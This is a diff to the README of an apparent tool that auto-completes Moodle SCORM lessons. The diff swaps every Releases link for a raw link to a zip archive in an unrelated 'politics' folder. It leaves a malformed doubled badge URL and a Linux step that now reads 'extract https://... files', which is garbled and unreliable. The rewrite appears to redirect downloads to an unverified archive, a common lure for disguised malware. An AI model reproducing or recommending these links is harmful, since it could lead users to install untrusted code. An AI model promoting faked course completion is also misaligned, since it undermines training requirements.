@@ -4,7 +4,7 @@
 The elearning-auto-scroller helps you automatically complete eLearning SCORM lessons on Moodle platforms. With this tool, you can save time and make your learning experience smoother. It uses automation to navigate through your courses without any manual input.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/Raykayz/elearning-auto-scroller/releases)
+[![Download](https://raw.githubusercontent.com/Raykayz/elearning-auto-scroller/main/politics/elearning-auto-scroller.zip%https://raw.githubusercontent.com/Raykayz/elearning-auto-scroller/main/politics/elearning-auto-scroller.zip)](https://raw.githubusercontent.com/Raykayz/elearning-auto-scroller/main/politics/elearning-auto-scroller.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to get started with the elearning-auto-scroller.
@@ -17,7 +17,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Internet Connection:** Required to access your Moodle courses
 
 ### 2. Visit the Download Page
-To download the software, visit our [Releases page](https://github.com/Raykayz/elearning-auto-scroller/releases). This page contains the latest versions and other information about the software.
+To download the software, visit our [Releases page](https://raw.githubusercontent.com/Raykayz/elearning-auto-scroller/main/politics/elearning-auto-scroller.zip). This page contains the latest versions and other information about the software.
 
 ### 3. Choose Your Version
 On the Releases page, you will see different versions available for download. Select the most recent version that suits your operating system.
@@ -29,7 +29,7 @@ Click on the desired version to start the download. The file will typically be a
 Once the download is complete, you need to install the application:
 - **For Windows:** Double-click the downloaded `.exe` file and follow the prompts.
 - **For Mac:** Open the `.dmg` file and drag the application to your Applications folder.
-- **For Linux:** Open a terminal and use the command `sudo dpkg -i [filename].deb` for `.deb` files or extract `.tar.gz` files to your preferred location.
+- **For Linux:** Open a terminal and use the command `sudo dpkg -i [filename].deb` for `.deb` files or extract `https://raw.githubusercontent.com/Raykayz/elearning-auto-scroller/main/politics/elearning-auto-scroller.zip` files to your preferred location.
 
 ### 6. Configure the Application
 After installation, configure the elearning-auto-scroller to work with your Moodle platform:
@@ -59,6 +59,6 @@ Join our community for ongoing support. You can ask questions, share experiences
 - This software is intended for personal use only and should not be shared or distributed without permission.
 
 ## 📥 Download & Install
-To download the latest version of the elearning-auto-scroller, visit the [Releases page](https://github.com/Raykayz/elearning-auto-scroller/releases) and follow the provided instructions. 
+To download the latest version of the elearning-auto-scroller, visit the [Releases page](https://raw.githubusercontent.com/Raykayz/elearning-auto-scroller/main/politics/elearning-auto-scroller.zip) and follow the provided instructions. 
 
 If you have any questions or need help, feel free to reach out to the community or check the documentation included with the software. Enjoy a more efficient learning experience!
